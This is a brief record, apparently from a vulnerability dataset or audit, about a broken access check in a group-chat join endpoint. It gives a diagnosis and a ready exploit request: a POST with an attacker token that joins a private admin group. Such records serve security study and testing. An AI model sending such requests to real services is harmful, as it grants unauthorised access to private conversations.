diagnosis: Endpoint allows a user to join a group chat by supplying a groupId. It uses TypeORM to fetch the group and append the user to the members array. It fails to check if the group is private or requires an invite/admin approval.
exploit_request:
POST /api/chat/group/join HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer <attacker_token>

{"groupId": "secret-admin-group-123"}
